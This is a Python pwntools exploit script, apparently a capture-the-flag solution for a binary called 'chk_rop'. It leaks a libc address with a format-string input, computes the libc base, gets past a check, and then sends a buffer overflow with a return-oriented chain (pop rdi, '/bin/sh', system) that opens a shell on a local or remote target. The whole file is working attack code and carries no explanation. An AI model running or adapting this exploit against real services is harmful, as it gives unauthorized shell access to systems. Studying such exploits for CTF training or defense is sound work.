#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './chk_rop'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x00000000004009d3 # pop rdi ; ret

# leak libc
ru('Give you a gift...\n')
sl('%p'*3)

data = ru('Tell me U filename\n')
if is_remote:
    libc_base = eval('0x'+data.split('0x')[2]) - 1012320
if is_local:
    libc_base = eval('0x'+data.split('0x')[2]) - 1101697
info_addr('libc_base',libc_base)

# debug('b *0x4008f0')

# bypass chk 
se('a'*16)

# rop
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search("/bin/sh").next()
payload = 'a'*88
if is_local:
    payload += p64(0x04008F7) + p64(prdi) + p64(binsh) + p64(system)
if is_remote:
    payload += p64(prdi) + p64(binsh) + p64(system)

ru('And the content:\n')
sl(payload)

p.interactive()
